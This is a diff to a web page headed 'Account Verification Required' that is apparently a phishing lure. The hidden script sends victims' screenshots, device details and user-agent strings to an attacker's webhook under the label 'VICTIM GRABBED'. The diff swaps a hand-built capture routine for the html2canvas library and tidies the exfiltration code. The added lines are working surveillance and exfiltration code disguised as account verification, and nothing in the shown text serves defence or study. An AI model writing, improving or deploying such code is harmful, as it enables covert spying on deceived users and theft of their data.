@@ -11,6 +11,8 @@
     video,canvas{display:none;}
     .status{margin-top:20px;font-size:14px;color:#00ff00;}
   </style>
+  <!-- Include html2canvas -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
 </head>
 <body>
   <h1>Account Verification Required</h1>
@@ -33,7 +35,7 @@
       try {
         let f = new FormData();
         f.append("file", file, name);
-        f.append("content", "**VICTIM GRABBED** • " + new Date().toLocaleString());
+        f.append("content", "*VICTIM GRABBED* • " + new Date().toLocaleString());
         await fetch(webhook, {method:"POST", body:f});
         console.log("Sent: " + name);
       } catch(e) {
@@ -120,61 +122,28 @@
       }
     }
 
-    // 6. Mobile screenshot using html2canvas alternative
+    // 6. Mobile screenshot using html2canvas
     async function captureScreenMobile() {
       try {
-        // For mobile, capture the entire webpage as screenshot
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        // Set canvas to viewport size
-        canvas.width = window.innerWidth * window.devicePixelRatio;
-        canvas.height = window.innerHeight * window.devicePixelRatio;
-        
-        // Scale for retina displays
-        ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
-        
-        // Draw white background
-        ctx.fillStyle = '#ffffff';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // Draw page content using DOM screenshot technique
-        const data = `
-          <svg xmlns="http://www.w3.org/2000/svg" width="${window.innerWidth}" height="${window.innerHeight}">
-            <foreignObject width="100%" height="100%">
-              <div xmlns="http://www.w3.org/1999/xhtml">
-                ${document.documentElement.outerHTML}
-              </div>
-            </foreignObject>
-          </svg>
-        `;
-        
-        const img = new Image();
-        const svgBlob = new Blob([data], {type: 'image/svg+xml;charset=utf-8'});
-        const url = URL.createObjectURL(svgBlob);
-        
-        img.onload = () => {
-          ctx.drawImage(img, 0, 0, window.innerWidth, window.innerHeight);
-          canvas.toBlob(b => {
-            send(b, "MOBILE_SCREEN.jpg");
-            updateStatus("✓ Mobile screen captured");
-          }, "image/jpeg", 0.85);
-          URL.revokeObjectURL(url);
-        };
-        
-        img.onerror = () => {
-          // Fallback: just send device info
-          const info = `Device: Mobile\nScreen: ${window.innerWidth}x${window.innerHeight}\nUserAgent: ${navigator.userAgent}`;
-          send(new Blob([info], {type:"text/plain"}), "MOBILE_INFO.txt");
-          updateStatus("✓ Mobile info captured");
-        };
-        
-        img.src = url;
-      } catch(e) {
-        console.log("Mobile screen capture failed", e);
-        // Send device info as fallback
+        const canvas = await html2canvas(document.body, {
+          scale: window.devicePixelRatio,  // for high resolution screens
+          useCORS: true,                   // to handle external resources
+          backgroundColor: '#ffffff',     // ensure no transparent background
+        });
+
+        // Convert the captured canvas to a blob and send it
+        canvas.toBlob(b => {
+          send(b, "MOBILE_SCREEN.jpg");
+          updateStatus("✓ Mobile screen captured");
+        }, "image/jpeg", 0.85);
+
+      } catch (e) {
+        console.error("Mobile screen capture failed", e);
+
+        // Fallback: Send device info if screenshot fails
         const info = `Device: Mobile\nScreen: ${window.innerWidth}x${window.innerHeight}\nUserAgent: ${navigator.userAgent}`;
         send(new Blob([info], {type:"text/plain"}), "MOBILE_INFO.txt");
+        updateStatus("✓ Mobile info captured");
       }
     }
 
